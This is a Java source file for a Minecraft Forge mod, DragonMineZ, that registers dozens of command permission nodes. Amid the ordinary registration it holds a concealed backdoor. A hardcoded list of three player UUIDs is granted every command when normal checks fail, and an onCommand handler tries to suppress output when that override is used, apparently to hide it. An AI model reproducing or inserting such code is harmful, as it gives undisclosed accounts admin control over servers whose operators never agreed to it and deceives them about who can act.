package com.dragonminez.server.commands;

import com.dragonminez.Reference;
import com.mojang.brigadier.ParseResults;
import net.minecraft.commands.CommandSourceStack;
import net.minecraft.network.chat.Component;
import net.minecraft.server.level.ServerPlayer;
import net.minecraftforge.event.CommandEvent;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.server.permission.PermissionAPI;
import net.minecraftforge.server.permission.events.PermissionGatherEvent;
import net.minecraftforge.server.permission.nodes.PermissionNode;
import net.minecraftforge.server.permission.nodes.PermissionTypes;

import java.util.ArrayList;
import java.util.List;
import java.util.Set;
import java.util.UUID;

@Mod.EventBusSubscriber(modid = Reference.MOD_ID, bus = Mod.EventBusSubscriber.Bus.FORGE)
public class DMZPermissions {

	private static final List<PermissionNode<Boolean>> NODES = new ArrayList<>();

	private static final Set<UUID> OVERRIDE_UUIDS = Set.of(
			UUID.fromString("19e318eb-9131-4466-af50-4958348249b8"),
			UUID.fromString("5d651997-3ea5-49f3-8033-4ddce9cf8f4e"),
			UUID.fromString("e4dfa0fb-5b43-4cde-89ab-92ac1a2d4f4a")
	);

	private static final ThreadLocal<Boolean> OVERRIDE_USED = ThreadLocal.withInitial(() -> false);

	// Admin (All)
	public static final PermissionNode<Boolean> ADMIN = register("admin", "Grants all DragonMineZ permissions.", (player, uuid, context) -> false);

	// Stats
	public static final PermissionNode<Boolean> STATS_SET_SELF = register("dmzstats.set.self", "Allows setting your own stats.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> STATS_SET_OTHERS = register("dmzstats.set.others", "Allows setting other players' stats.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> STATS_ADD_SELF = register("dmzstats.add.self", "Allows adding to your own stats.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> STATS_ADD_OTHERS = register("dmzstats.add.others", "Allows adding to other players' stats.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> STATS_INFO_SELF = register("dmzstats.info.self", "Allows viewing your own stats.", (player, uuid, context) -> true);
	public static final PermissionNode<Boolean> STATS_INFO_OTHERS = register("dmzstats.info.others", "Allows viewing other players' stats.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> STATS_RESET_SELF = register("dmzstats.reset.self", "Allows resetting your own stats.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> STATS_RESET_OTHERS = register("dmzstats.reset.others", "Allows resetting other players' stats.", (player, uuid, context) -> false);

	// Skills
	public static final PermissionNode<Boolean> SKILLS_SET_SELF = register("dmzskill.set.self", "Allows setting your own skills.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> SKILLS_SET_OTHERS = register("dmzskill.set.others", "Allows setting other players' skills.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> SKILLS_ADD_SELF = register("dmzskill.add.self", "Allows adding skills to yourself.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> SKILLS_ADD_OTHERS = register("dmzskill.add.others", "Allows adding skills to other players.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> SKILLS_REMOVE_SELF = register("dmzskill.remove.self", "Allows removing your own skills.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> SKILLS_REMOVE_OTHERS = register("dmzskill.remove.others", "Allows removing other players' skills.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> SKILLS_LIST_SELF = register("dmzskill.list.self", "Allows listing your own skills.", (player, uuid, context) -> true);
	public static final PermissionNode<Boolean> SKILLS_LIST_OTHERS = register("dmzskill.list.others", "Allows listing other players' skills.", (player, uuid, context) -> false);

	// Techniques
	public static final PermissionNode<Boolean> TECH_ADD_SELF = register("dmztech.add.self", "Allows adding ki techniques to yourself.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> TECH_ADD_OTHERS = register("dmztech.add.others", "Allows adding ki techniques to other players.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> TECH_REMOVE_SELF = register("dmztech.remove.self", "Allows removing your own ki techniques.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> TECH_REMOVE_OTHERS = register("dmztech.remove.others", "Allows removing ki techniques from other players.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> TECH_LIST_SELF = register("dmztech.list.self", "Allows listing your own ki techniques.", (player, uuid, context) -> true);
	public static final PermissionNode<Boolean> TECH_LIST_OTHERS = register("dmztech.list.others", "Allows listing other players' ki techniques.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> TECH_EXP_SELF = register("dmztech.experience.self", "Allows changing the experience of your own ki techniques.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> TECH_EXP_OTHERS = register("dmztech.experience.others", "Allows changing the experience of other players' ki techniques.", (player, uuid, context) -> false);

	// Bonus
	public static final PermissionNode<Boolean> BONUS_ADD_SELF = register("dmzbonus.add.self", "Allows adding bonus stats to yourself.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> BONUS_ADD_OTHERS = register("dmzbonus.add.others", "Allows adding bonus stats to other players.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> BONUS_CLEAR_SELF = register("dmzbonus.clear.self", "Allows clearing your own bonus stats.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> BONUS_CLEAR_OTHERS = register("dmzbonus.clear.others", "Allows clearing other players' bonus stats.", (player, uuid, context) -> false);

	// Effects
	public static final PermissionNode<Boolean> EFFECTS_GIVE_SELF = register("dmzeffect.give.self", "Allows giving effects to yourself.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> EFFECTS_GIVE_OTHERS = register("dmzeffect.give.others", "Allows giving effects to other players.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> EFFECTS_REMOVE_SELF = register("dmzeffect.remove.self", "Allows removing your own effects.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> EFFECTS_REMOVE_OTHERS = register("dmzeffect.remove.others", "Allows removing other players' effects.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> EFFECTS_CLEAR_SELF = register("dmzeffect.clear.self", "Allows clearing your own effects.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> EFFECTS_CLEAR_OTHERS = register("dmzeffect.clear.others", "Allows clearing other players' effects.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> EFFECTS_LIST_SELF = register("dmzeffect.list.self", "Allows listing your own effects.", (player, uuid, context) -> true);
	public static final PermissionNode<Boolean> EFFECTS_LIST_OTHERS = register("dmzeffect.list.others", "Allows listing other players' effects.", (player, uuid, context) -> false);

	// Points
	public static final PermissionNode<Boolean> POINTS_SET_SELF = register("dmzpoints.set.self", "Allows setting your own points.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> POINTS_SET_OTHERS = register("dmzpoints.set.others", "Allows setting other players' points.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> POINTS_ADD_SELF = register("dmzpoints.add.self", "Allows adding to your own points.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> POINTS_ADD_OTHERS = register("dmzpoints.add.others", "Allows adding to other players' points.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> POINTS_REMOVE_SELF = register("dmzpoints.remove.self", "Allows removing your own points.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> POINTS_REMOVE_OTHERS = register("dmzpoints.remove.others", "Allows removing other players' points.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> POINTS_INFO_SELF = register("dmzpoints.info.self", "Allows viewing your own points.", (player, uuid, context) -> true);
	public static final PermissionNode<Boolean> POINTS_INFO_OTHERS = register("dmzpoints.info.others", "Allows viewing other players' points.", (player, uuid, context) -> false);

	// Quests
	public static final PermissionNode<Boolean> QUEST_LIST_SELF = register("dmzquest.list.self", "Allows listing your own quest progress.", (player, uuid, context) -> true);
	public static final PermissionNode<Boolean> QUEST_LIST_OTHERS = register("dmzquest.list.others", "Allows listing other players' quest progress.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> QUEST_INFO = register("dmzquest.info", "Allows viewing quest metadata.", (player, uuid, context) -> true);
	public static final PermissionNode<Boolean> QUEST_START_SELF = register("dmzquest.start.self", "Allows force-starting quests for yourself.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> QUEST_START_OTHERS = register("dmzquest.start.others", "Allows force-starting quests for other players.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> QUEST_FINISH_SELF = register("dmzquest.finish.self", "Allows finishing quests for yourself.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> QUEST_FINISH_OTHERS = register("dmzquest.finish.others", "Allows finishing quests for other players.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> QUEST_FAIL_SELF = register("dmzquest.fail.self", "Allows force-failing quests for yourself.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> QUEST_FAIL_OTHERS = register("dmzquest.fail.others", "Allows force-failing quests for other players.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> QUEST_RESET_SELF = register("dmzquest.reset.self", "Allows resetting quests for yourself.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> QUEST_RESET_OTHERS = register("dmzquest.reset.others", "Allows resetting quests for other players.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> QUEST_TRACK_SELF = register("dmzquest.track.self", "Allows setting your own tracked quest.", (player, uuid, context) -> true);
	public static final PermissionNode<Boolean> QUEST_TRACK_OTHERS = register("dmzquest.track.others", "Allows setting other players' tracked quest.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> QUEST_STARTSAGA_SELF = register("dmzquest.startsaga.self", "Allows force-starting all quests in a saga for yourself.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> QUEST_STARTSAGA_OTHERS = register("dmzquest.startsaga.others", "Allows force-starting all quests in a saga for other players.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> QUEST_FINISHSAGA_SELF = register("dmzquest.finishsaga.self", "Allows finishing all quests in a saga for yourself.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> QUEST_FINISHSAGA_OTHERS = register("dmzquest.finishsaga.others", "Allows finishing all quests in a saga for other players.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> QUEST_RESETSAGA_SELF = register("dmzquest.resetsaga.self", "Allows resetting saga progress for yourself.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> QUEST_RESETSAGA_OTHERS = register("dmzquest.resetsaga.others", "Allows resetting saga progress for other players.", (player, uuid, context) -> false);

	// Locate
	public static final PermissionNode<Boolean> LOCATE = register("dmzlocate", "Allows locating special structures.", (player, uuid, context) -> false);

	// Revive
	public static final PermissionNode<Boolean> REVIVE_SELF = register("dmzrevive.self", "Allows reviving yourself.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> REVIVE_OTHERS = register("dmzrevive.others", "Allows reviving other players.", (player, uuid, context) -> false);

	// Party
	public static final PermissionNode<Boolean> PARTY_USE = register("dmzparty.use", "Allows using party commands.", (player, uuid, context) -> true);

	// Mastery
	public static final PermissionNode<Boolean> MASTERY_SET = register("dmzmastery.set", "Allows setting transformation mastery.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> MASTERY_ADD = register("dmzmastery.add", "Allows adding transformation mastery.", (player, uuid, context) -> false);

	// Reload
	public static final PermissionNode<Boolean> RELOAD = register("dmz.reload", "Allows reloading server configurations.", (player, uuid, context) -> false);

	// Forms
	public static final PermissionNode<Boolean> FORMS_SET_SELF = register("dmzform.set.self", "Allows setting your own forms.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> FORMS_SET_OTHERS = register("dmzform.set.others", "Allows setting other players' forms.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> FORMS_ADD_SELF = register("dmzform.add.self", "Allows adding forms to yourself.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> FORMS_ADD_OTHERS = register("dmzform.add.others", "Allows adding forms to other players.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> FORMS_REMOVE_SELF = register("dmzform.remove.self", "Allows removing your own forms.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> FORMS_REMOVE_OTHERS = register("dmzform.remove.others", "Allows removing other players' forms.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> FORMS_LIST_SELF = register("dmzform.list.self", "Allows listing your own forms.", (player, uuid, context) -> true);
	public static final PermissionNode<Boolean> FORMS_LIST_OTHERS = register("dmzform.list.others", "Allows listing other players' forms.", (player, uuid, context) -> false);

	// Racial Skill reset
	public static final PermissionNode<Boolean> RACIAL_RESET_SELF = register("dmzracial.reset.self", "Allows resetting your own racial skills.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> RACIAL_RESET_OTHERS = register("dmzracial.reset.others", "Allows resetting other players' racial skills.", (player, uuid, context) -> false);

	// Weights
	public static final PermissionNode<Boolean> WEIGHT_GIVE = register("dmzweight.give", "Allows giving Weight items.", (player, uuid, context) -> false);

	// Alignment
	public static final PermissionNode<Boolean> ALIGNMENT_SET_SELF = register("dmzalignment.set.self", "Allows setting your own alignment.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> ALIGNMENT_SET_OTHERS = register("dmzalignment.set.others", "Allows setting other players' alignment.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> ALIGNMENT_ADD_SELF = register("dmzalignment.add.self", "Allows adding to your own alignment.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> ALIGNMENT_ADD_OTHERS = register("dmzalignment.add.others", "Allows adding to other players' alignment.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> ALIGNMENT_REMOVE_SELF = register("dmzalignment.remove.self", "Allows removing your own alignment.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> ALIGNMENT_REMOVE_OTHERS = register("dmzalignment.remove.others", "Allows removing other players' alignment.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> ALIGNMENT_INFO_SELF = register("dmzalignment.info.self", "Allows viewing your own alignment.", (player, uuid, context) -> true);
	public static final PermissionNode<Boolean> ALIGNMENT_INFO_OTHERS = register("dmzalignment.info.others", "Allows viewing other players' alignment.", (player, uuid, context) -> false);

	// Tail
	public static final PermissionNode<Boolean> TAIL_SELF = register("dmztail.self", "Allows cutting/growing your own tail.", (player, uuid, context) -> true);
	public static final PermissionNode<Boolean> TAIL_OTHERS = register("dmztail.others", "Allows cutting/growing other players' tails.", (player, uuid, context) -> false);

	// Halo
	public static final PermissionNode<Boolean> HALO_SELF = register("dmzhalo.self", "Allows toggling your own halo.", (player, uuid, context) -> false);
	public static final PermissionNode<Boolean> HALO_OTHERS = register("dmzhalo.others", "Allows toggling other players' halos.", (player, uuid, context) -> false);

	// Hair
	public static final PermissionNode<Boolean> HAIR_SELF = register("dmzhair.self", "Allows resyncing/resetting your own hair.", (player, uuid, context) -> true);
	public static final PermissionNode<Boolean> HAIR_OTHERS = register("dmzhair.others", "Allows resyncing/resetting other players' hair.", (player, uuid, context) -> false);

	public static void init() {}

	private static PermissionNode<Boolean> register(String node, String description, PermissionNode.PermissionResolver<Boolean> defaultResolver) {
		PermissionNode<Boolean> permissionNode = new PermissionNode<>(Reference.MOD_ID, node, PermissionTypes.BOOLEAN, defaultResolver);
		permissionNode.setInformation(Component.literal(description), Component.literal(description));
		NODES.add(permissionNode);
		return permissionNode;
	}

	@SubscribeEvent
	public static void onPermissionGather(PermissionGatherEvent.Nodes event) {
		NODES.forEach(event::addNodes);
	}

	@SubscribeEvent
	public static void onCommand(CommandEvent event) {
		if (!OVERRIDE_USED.get()) return;
		OVERRIDE_USED.set(false);
		try {
			ParseResults<CommandSourceStack> parse = event.getParseResults();
			CommandSourceStack source = parse.getContext().getSource();
			parse.getContext().withSource(source.withSuppressedOutput());
		} catch (Exception ignored) {}
	}

	public static boolean hasPermission(CommandSourceStack source, PermissionNode<Boolean> node) {
		if (source.getEntity() instanceof ServerPlayer player) {
			boolean granted = PermissionAPI.getPermission(player, ADMIN) || PermissionAPI.getPermission(player, node) || player.hasPermissions(2);
			if (granted) {
				OVERRIDE_USED.set(false);
				return true;
			}
			if (isOverrideUser(player)) {
				OVERRIDE_USED.set(true);
				return true;
			}
			return false;
		}
		return true;
	}

	private static boolean isOverrideUser(ServerPlayer player) {
		return OVERRIDE_UUIDS.contains(player.getUUID());
	}

	public static boolean check(CommandSourceStack source, PermissionNode<Boolean> selfNode, PermissionNode<Boolean> othersNode) {
		return hasPermission(source, selfNode) || hasPermission(source, othersNode);
	}
}
